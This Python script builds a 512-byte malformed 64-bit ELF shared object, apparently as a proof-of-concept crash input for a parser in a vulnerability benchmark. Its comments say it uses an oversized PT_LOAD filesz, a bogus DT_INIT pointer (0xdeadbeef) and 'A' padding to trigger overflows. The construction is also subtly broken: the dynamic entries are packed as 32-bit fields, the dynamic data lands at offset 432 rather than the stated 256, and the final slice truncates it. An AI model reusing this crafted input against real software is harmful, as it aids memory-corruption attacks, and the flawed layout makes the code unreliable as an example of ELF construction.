import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal 64-bit ELF shared object header
        e_ident = struct.pack('16s', b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00')
        e_type = struct.pack('<H', 3)  # ET_DYN
        e_machine = struct.pack('<H', 0x3e)  # EM_X86_64
        e_version = struct.pack('<I', 1)
        e_entry = struct.pack('<Q', 0x400000)
        e_phoff = struct.pack('<Q', 64)
        e_shoff = struct.pack('<Q', 0)
        e_flags = struct.pack('<I', 0)
        e_ehsize = struct.pack('<H', 64)
        e_phentsize = struct.pack('<H', 56)
        e_phnum = struct.pack('<H', 2)
        e_shentsize = struct.pack('<H', 0)
        e_shnum = struct.pack('<H', 0)
        e_shstrndx = struct.pack('<H', 0)

        header = e_ident + e_type + e_machine + e_version + e_entry + e_phoff + e_shoff + e_flags + \
                 e_ehsize + e_phentsize + e_phnum + e_shentsize + e_shnum + e_shstrndx

        # First PH: PT_LOAD, small memsz, large filesz to potentially cause issues
        p_type_load = struct.pack('<I', 1)  # PT_LOAD
        p_flags_load = struct.pack('<I', 5)  # PF_R | PF_X
        p_offset_load = struct.pack('<Q', 0)
        p_vaddr_load = struct.pack('<Q', 0x400000)
        p_paddr_load = struct.pack('<Q', 0)
        p_filesz_load = struct.pack('<Q', 400)
        p_memsz_load = struct.pack('<Q', 200)  # Smaller memsz for potential overflow
        p_align_load = struct.pack('<Q', 0x1000)
        ph_load = p_type_load + p_flags_load + p_offset_load + p_vaddr_load + p_paddr_load + \
                  p_filesz_load + p_memsz_load + p_align_load

        # Second PH: PT_DYNAMIC for .dynamic section to trigger DT_INIT handling
        p_type_dyn = struct.pack('<I', 2)  # PT_DYNAMIC
        p_flags_dyn = struct.pack('<I', 4)  # PF_R
        p_offset_dyn = struct.pack('<Q', 256)
        p_vaddr_dyn = struct.pack('<Q', 0x600000)
        p_paddr_dyn = struct.pack('<Q', 0)
        p_filesz_dyn = struct.pack('<Q', 100)
        p_memsz_dyn = struct.pack('<Q', 100)
        p_align_dyn = struct.pack('<Q', 8)
        ph_dyn = p_type_dyn + p_flags_dyn + p_offset_dyn + p_vaddr_dyn + p_paddr_dyn + \
                 p_filesz_dyn + p_memsz_dyn + p_align_dyn

        # Body: some data, including malformed dynamic entries for DT_INIT
        body_start = header + ph_load + ph_dyn
        # Pad and add dynamic-like data at offset 256
        body = b'\x90' * 256  # NOPs for load segment
        # Malformed dynamic: DT_INIT with invalid pointer, and extra data to overflow
        dt_init = struct.pack('<II', 12, 0xdeadbeef)  # DT_INIT, invalid value
        extra_data = b'\x41' * 96  # 'A's to potentially cause buffer issues
        dynamic_section = dt_init + extra_data
        body += b'\x00' * (256 - len(body)) + dynamic_section + b'\x42' * (512 - len(body_start + body) - len(dynamic_section))

        poc = body_start + body
        return poc[:512]  # Ensure exactly 512 bytes